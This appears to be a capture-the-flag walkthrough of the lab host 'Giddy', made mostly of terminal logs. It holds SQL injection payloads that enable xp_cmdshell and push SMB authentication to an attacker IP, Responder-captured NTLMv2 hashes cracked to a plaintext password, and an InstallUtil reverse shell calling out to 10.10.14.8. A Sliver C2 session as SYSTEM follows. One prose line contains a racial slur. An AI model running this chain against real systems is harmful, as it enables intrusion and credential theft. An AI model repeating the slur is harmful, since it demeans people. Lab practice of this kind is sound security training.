
```
kali@kali ~> nmap -sC -sV -Pn 10.10.10.104
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-02 11:39 EDT
Nmap scan report for 10.10.10.104
Host is up (0.069s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| tls-alpn:
|   h2
|_  http/1.1
|_ssl-date: 2024-11-02T15:41:10+00:00; +1m23s from scanner time.
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Not valid before: 2018-06-16T21:28:55
|_Not valid after:  2018-09-14T21:28:55
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-11-02T15:41:10+00:00; +1m23s from scanner time.
| ssl-cert: Subject: commonName=Giddy
| Not valid before: 2024-11-01T15:39:15
|_Not valid after:  2025-05-03T15:39:15
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1m22s, deviation: 0s, median: 1m22s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.00 seconds

```




```
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_dirtree '\\10.10.14.8\a';
EXEC xp_dirtree '\\10.10.14.8\a';
```


```
A' OR EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_dirtree '\\10.10.14.8\a';
```



```
a'; EXEC master..xp_dirtree "\\attacker_ip\share"-- 
```


```
[!] Responder must be run as root.
kali@kali ~ [255]> sudo responder -I tun0 -v
[sudo] password for kali:
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.8]
    Responder IPv6             [dead:beef:2::1006]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-IXS4WXCXLIL]
    Responder Domain Name      [34XM.LOCAL]
    Responder DCE-RPC Port     [46936]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.10.104
[SMB] NTLMv2-SSP Username : GIDDY\Stacy
[SMB] NTLMv2-SSP Hash     : Stacy::GIDDY:cdc14247334419ac:E04F03A27028CAC483A70647CCCAA876:0101000000000000004EBD48242DDB01289E16190757103400000000020008003300340058004D0001001E00570049004E002D00490058005300340057005800430058004C0049004C0004003400570049004E002D00490058005300340057005800430058004C0049004C002E003300340058004D002E004C004F00430041004C00030014003300340058004D002E004C004F00430041004C00050014003300340058004D002E004C004F00430041004C0007000800004EBD48242DDB0106000400020000000800300030000000000000000000000000300000E1E753226C48DC48A38423B5B2F683E82774955A643611080D28E80A6EB87D160A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003800000000000000000000000000
[SMB] NTLMv2-SSP Client   : 10.10.10.104
[SMB] NTLMv2-SSP Username : GIDDY\Stacy
[SMB] NTLMv2-SSP Hash     : Stacy::GIDDY:66d62fcfc6e20d09:F8898C739CAE4C1168210BCDF20BBD2F:0101000000000000004EBD48242DDB0144125FD3CD0F52F900000000020008003300340058004D0001001E00570049004E002D00490058005300340057005800430058004C0049004C0004003400570049004E002D00490058005300340057005800430058004C0049004C002E003300340058004D002E004C004F00430041004C00030014003300340058004D002E004C004F00430041004C00050014003300340058004D002E004C004F00430041004C0007000800004EBD48242DDB0106000400020000000800300030000000000000000000000000300000E1E753226C48DC48A38423B5B2F683E82774955A643611080D28E80A6EB87D160A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003800000000000000000000000000
[SMB] NTLMv2-SSP Client   : 10.10.10.104
[SMB] NTLMv2-SSP Username : GIDDY\Stacy
[SMB] NTLMv2-SSP Hash     : Stacy::GIDDY:1a1215edaac9173d:B960608492E3AD8355CCD4941F91AD3C:0101000000000000004EBD48242DDB0141D2EDAE37A35C6000000000020008003300340058004D0001001E00570049004E002D00490058005300340057005800430058004C0049004C0004003400570049004E002D00490058005300340057005800430058004C0049004C002E003300340058004D002E004C004F00430041004C00030014003300340058004D002E004C004F00430041004C00050014003300340058004D002E004C004F00430041004C0007000800004EBD48242DDB0106000400020000000800300030000000000000000000000000300000E1E753226C48DC48A38423B5B2F683E82774955A643611080D28E80A6EB87D160A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003800000000000000000000000000

```


```
kali@kali ~> hashcat -m 5600 hash123.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-12th Gen Intel(R) Core(TM) i5-12400F, 2212/4489 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

STACY::GIDDY:66d62fcfc6e20d09:f8898c739cae4c1168210bcdf20bbd2f:0101000000000000004ebd48242ddb0144125fd3cd0f52f900000000020008003300340058004d0001001e00570049004e002d00490058005300340057005800430058004c0049004c0004003400570049004e002d00490058005300340057005800430058004c0049004c002e003300340058004d002e004c004f00430041004c00030014003300340058004d002e004c004f00430041004c00050014003300340058004d002e004c004f00430041004c0007000800004ebd48242ddb0106000400020000000800300030000000000000000000000000300000e1e753226c48dc48a38423b5b2f683e82774955a643611080d28e80a6eb87d160a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003800000000000000000000000000:xNnWo6272k7x

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: STACY::GIDDY:66d62fcfc6e20d09:f8898c739cae4c1168210...000000
Time.Started.....: Sat Nov  2 12:44:42 2024 (2 secs)
Time.Estimated...: Sat Nov  2 12:44:44 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1880.5 kH/s (0.98ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2691072/14344385 (18.76%)
Rejected.........: 0/2691072 (0.00%)
Restore.Point....: 2686976/14344385 (18.73%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: xamuraix -> x21csm
Hardware.Mon.#1..: Util: 52%

Started: Sat Nov  2 12:44:34 2024
Stopped: Sat Nov  2 12:44:46 2024
```



```
kali@kali ~> netexec rdp 10.10.10.104 -u 'stacy' -p 'xNnWo6272k7x'
RDP         10.10.10.104    3389   GIDDY            [*] Windows 10 or Windows Server 2016 Build 14393 (name:GIDDY) (domain:Giddy) (nla:True)
RDP         10.10.10.104    3389   GIDDY            [+] Giddy\stacy:xNnWo6272k7x
kali@kali ~> netexec winrm 10.10.10.104 -u 'stacy' -p 'xNnWo6272k7x'
WINRM       10.10.10.104    5985   GIDDY            [*] Windows 10 / Server 2016 Build 14393 (name:GIDDY) (domain:Giddy)
WINRM       10.10.10.104    5985   GIDDY            [+] Giddy\stacy:xNnWo6272k7x (Pwn3d!)
WINRM       10.10.10.104    5985   GIDDY            [-] Neo4J does not seem to be available on bolt://127.0.0.1:7687.
WINRM       10.10.10.104    5985   GIDDY            [-] Neo4J does not seem to be available on bolt://127.0.0.1:7687.
```


```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U  /revshell=True /rhost=10.10.14.8 /rport=9999 .\PsBypassCLM.exe
```

here we get a reverse shell without the nigger CLM bullshit, we need to now find out the service's name this can be done using registry

```

```



```
kali@kali ~> sliver
? Select a server: kali@localhost (a50758307195369f)
Connecting to localhost:31337 ...

.------..------..------..------..------..------.
|S.--. ||L.--. ||I.--. ||V.--. ||E.--. ||R.--. |
| :/\: || :/\: || (\/) || :(): || (\/) || :(): |
| :\/: || (__) || :\/: || ()() || :\/: || ()() |
| '--'S|| '--'L|| '--'I|| '--'V|| '--'E|| '--'R|
`------'`------'`------'`------'`------'`------'

All hackers gain deathtouch
[*] Server v1.5.42 - 85b0e870d05ec47184958dbcb871ddee2eb9e3df
[*] Welcome to the sliver shell, please type 'help' for options

[*] Session 6187dc1f ITCHY_GENE - 10.10.10.104:49730 (Giddy) - windows/amd64 - Sat, 02 Nov 2024 15:35:50 EDT

sliver > use

? Select a session or beacon: SESSION  6187dc1f  ITCHY_GENE  10.10.10.104:49730  Giddy  NT AUTHORITY\SYSTEM  windows/amd64
[*] Active session ITCHY_GENE (6187dc1f-b231-4f3b-a00e-ba43faba2045)

```






```
sliver (ITCHY_GENE) > shell

? This action is bad OPSEC, are you an adult? Yes

[*] Wait approximately 10 seconds after exit, and press <enter> to continue
[*] Opening shell tunnel (EOF to exit) ...

[*] Started remote shell with pid 3876

PS C:\> cd C:\users\administrator
cd administrator
PS C:\users\administrator> dir
dir


    Directory: C:\users\administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        6/16/2018   8:56 PM                Contacts
d-r---        6/17/2018  10:53 AM                Desktop
d-r---        6/17/2018  10:02 AM                Documents
d-r---        6/16/2018   8:56 PM                Downloads
d-r---        6/16/2018   8:56 PM                Favorites
d-r---        6/16/2018   8:56 PM                Links
d-r---        6/16/2018   8:56 PM                Music
d-r---        6/16/2018   8:56 PM                Pictures
d-r---        6/16/2018   8:56 PM                Saved Games
d-r---        6/16/2018   8:56 PM                Searches
d-r---        6/16/2018   8:56 PM                Videos
-a----        6/17/2018  10:05 AM            191 sdset
sliver (ITCHY_GENE) > cd desktop
dcd desktop
PS C:\users\administrator\desktop> ir
dir


    Directory: C:\users\administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        11/2/2024  11:40 AM             34 root.txt
-a----        6/16/2018   9:54 PM            842 Ubiquiti UniFi Video.lnk


PS C:\users\administrator\desktop> type root.txt
type root.txt
dbd5cf2b068d4c5ae3c9533ae3197d78

```



## LISTING SERVICES USING REGISTRY ONE LINER


```
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object { $props = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue; [PSCustomObject]@{ Name = $_.PSChildName; Description = $props.Description; PathName = $props.ImagePath } } | Where-Object { $_.Description } | Format-Table -AutoSize
```